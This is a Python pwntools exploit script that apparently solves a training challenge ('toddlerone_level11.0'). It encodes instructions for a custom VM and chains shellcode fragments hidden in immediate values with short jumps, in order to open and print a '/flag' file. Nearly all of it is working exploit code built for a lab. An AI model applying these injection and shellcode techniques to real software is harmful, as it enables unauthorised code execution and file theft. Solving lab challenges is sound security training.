'''
op  : op[2]
arg1: op[1]
arg2: op[0]
'''
from pwn import *
context.arch = "amd64"
def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(8, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="cbaifsd"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(8, "little")
    elif reg == "N":
        return b"\x00"*8
    elif arg == "open":
        return b"\x23"
    elif arg == "read_memory":
        return b"\x20"
    elif arg == "write":
        return b"\x02"
    
def assembly(ass):
    if ass == "":
        return b""
    op = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op += b"\x40"
    elif(ass[0] == "ADD"):
        op += b"\x04"
    elif(ass[0] == "STK"):
        op += b"\x10"
    elif(ass[0] == "STM"):
        op += b"\x20"
    elif(ass[0] == "LDM"):
        op += b"\x02"
    elif(ass[0] == "CMP"):
        op += b"\x08"
    elif(ass[0] == "JMP"):
        op += b"\x80"
    elif(ass[0] == "SYS"):
        op += b"\x01"
    op += b"\x00"*7

    arg =[]
    for i in ass:
        g = getarg(i)
        if g != None:
            arg.append(g)
    
    bc = arg[1] + arg[0] + op
    assert(len(bc) == 0x18)
    return bc


c = bytearray()
# asm = '''
# IMM d = 0x2f
# IMM c = 0x80
# STM *c = d
# ADD a b
# IMM d = 0x66
# IMM c = 0x81
# STM *c = d

# IMM d = 0x6c
# IMM c = 0x82
# STM *c = d

# IMM d = 0x61
# IMM c = 0x83
# STM *c = d

# IMM d = 0x67
# IMM c = 0x84
# STM *c = d

# IMM d = 0x0
# IMM c = 0x85
# STM *c = d

# IMM a = 0x80
# IMM b = 0x40
# IMM c = 0xff

# '''
# my_sc = asm('''
#             push 0x41
#             mov rdi, rsp
#             mov sil, 0x4
#             mov al, 0x5a
#             syscall
# '''
# )
yasm='''
IMM a = 0xffffffffffffe7d8
IMM b = 0x13370c7
STM *a = b
IMM a = 0xffffffffffffe7e0
IMM b = 0x67616c662f
STM *a = b

'''
yasm = yasm.split("\n")
yasm.append("IMM a = "+ hex(int.from_bytes(asm("xor rsi, rsi; mov rdi, rsp; jmp $+0xb"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("xor rax, rax; mov al, 0x02; jmp $+0xc"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("syscall; mov rsi, rax; jmp $+0xc"), "little")))

yasm.append("IMM a = "+ hex(int.from_bytes(asm("xor rax, rax; mov al, 0x28; jmp $+0xc"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("xor rdi, rdi; mov dil, 0x01; jmp $+0xb"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("xor rdx, rdx; jmp $+0xe"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("mov r10d, 0x7fffffff; jmp $+0xb"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("syscall; xor rax, rax; jmp $+0xc"), "little")))
yasm.append("IMM a = "+ hex(int.from_bytes(asm("mov al, 0x3c; syscall"), "little")))
for i in yasm:
    c+=assembly(i)
    if i != "":
        print(i + "   ", end="")
        print(assembly(i))

#ROP
# file = ELF("./toddlerone_level11.0")
# rop = ROP(file)

p = process("/challenge/toddlerone_level11.0")
#context.terminal = ['tmux', '-h']
#p = gdb.debug("/challenge/toddlerone_level11.0", gdbscript="source /opt/gef/gef.py")
print(p.readuntil(b'yancode: '))

p.send(c)

all = p.recvall()


with open("/home/hacker/ttt.out", 'wb') as fd:
    fd.write(all)
#print(all.decode(errors="ignore"))

